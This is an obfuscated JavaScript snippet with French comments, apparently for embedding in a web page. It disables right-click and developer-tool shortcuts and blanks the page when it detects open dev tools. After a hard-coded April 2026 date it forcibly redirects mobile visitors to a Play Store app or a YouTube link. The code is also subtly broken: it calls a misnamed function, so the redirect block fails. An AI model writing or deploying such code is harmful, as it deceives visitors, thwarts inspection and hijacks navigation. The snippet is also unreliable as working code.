(function(){
    // ===[ Table de correspondances obfusquée ]===
    var _0x2a3b = {
        '0x0': 'addEventListener',
        '0x1': 'contextmenu',
        '0x2': 'preventDefault',
        '0x3': 'keydown',
        '0x4': 'key',
        '0x5': 'ctrlKey',
        '0x6': 'shiftKey',
        '0x7': 'outerWidth',
        '0x8': 'innerWidth',
        '0x9': 'outerHeight',
        '0xa': 'innerHeight',
        '0xb': 'body',
        '0xc': 'innerHTML',
        '0xd': 'location',
        '0xe': 'href',
        '0xf': 'about:blank',
        '0x10': 'userAgent',
        '0x11': 'test',
        '0x12': 'UTC',
        '0x13': 'now',
        '0x14': 'market://details?id=com.diofdev.compo',
        '0x15': 'https://play.google.com/store/apps/details?id=com.diofdev.compo',
        '0x16': 'iPhone|iPad|iPod',
        '0x17': 'https://youtube.com/shorts/QKqslBnI77I?si=4nrxqvGhcDP7Lfxk'
    };
    function _0x4c1d(_0x1a2b){
        return _0x2a3b[_0x1a2b];
    }

    // ===[ Anti-debug / Anti-inspection ]===
    document[_0x4c1d('0x0')](_0x4c1d('0x1'), function(_0x3e4f){
        _0x3e4f[_0x4c1d('0x2')]();
        return !![];
    });
    document[_0x4c1d('0x0')](_0x4c1d('0x3'), function(_0x5d6e){
        var _0x7f8g = _0x5d6e[_0x4c1d('0x4')];
        if(_0x7f8g === 'F12' || (_0x5d6e[_0x4c1d('0x5')] && _0x5d6e[_0x4c1d('0x6')] && (_0x7f8g === 'I' || _0x7f8g === 'J')) || (_0x5d6e[_0x4c1d('0x5')] && _0x7f8g === 'U')){
            _0x5d6e[_0x4c1d('0x2')]();
            return ![];
        }
    });

    var _0x9h0i = ![];
    var _0x1j2k = 0xa0;
    var _0x3l4m = function(){
        var _0x5n6o = window[_0x4c1d('0x7')] - window[_0x4c1d('0x8')] > _0x1j2k;
        var _0x7p8q = window[_0x4c1d('0x9')] - window[_0x4c1d('0xa')] > _0x1j2k;
        if(_0x5n6o || _0x7p8q){
            _0x9h0i = !![];
            document[_0x4c1d('0xb')][_0x4c1d('0xc')] = '';
            window[_0x4c1d('0xd')][_0x4c1d('0xe')] = _0x4c1d('0xf');
        }
    };
    setInterval(_0x3l4m, 0x3e8);

    // ===[ Détection mobile ]===
    function _0xr1s2(){
        var _0t3u4 = navigator[_0x4c1d('0x10')];
        var _0v5w6x = /Mobi|Android|iPhone|BlackBerry|Windows Phone/i[_0x4c1d('0x11')](_0t3u4);
        var _0y7z8a = window[_0x4c1d('0x8')] <= 0x300;
        return _0v5w6x && _0y7z8a;
    }

    // ===[ Détection iOS ]===
    function _0a9b0c(){
        var _0d1e2f = navigator[_0x4c1d('0x10')];
        return new RegExp(_0x4c1d('0x16'))[_0x4c1d('0x11')](_0d1e2f);
    }

    // ===[ Condition date après 05 avril 2026 11h00 GMT ]===
    function _0b9c0d(){
        var _0e1f2g = Date[_0x4c1d('0x12')](2026, 0x3, 0x5, 0xb, 0x0, 0x0);
        return Date[_0x4c1d('0x13')]() >= _0e1f2g;
    }

    // ===[ Redirection conditionnelle ]===
    if(_0r1s2() && _0b9c0d()){
        if(_0a9b0c()){
            // iOS : redirection vers le tutoriel YouTube
            window[_0x4c1d('0xd')][_0x4c1d('0xe')] = _0x4c1d('0x17');
        } else {
            // Android (ou autre) : deep link Play Store + fallback
            window[_0x4c1d('0xd')][_0x4c1d('0xe')] = _0x4c1d('0x14');
            setTimeout(function(){
                if(document[_0x4c1d('0xb')] && document[_0x4c1d('0xb')][_0x4c1d('0xc')] !== ''){
                    window[_0x4c1d('0xd')][_0x4c1d('0xe')] = _0x4c1d('0x15');
                }
            }, 0x1f4);
        }
    }
})();
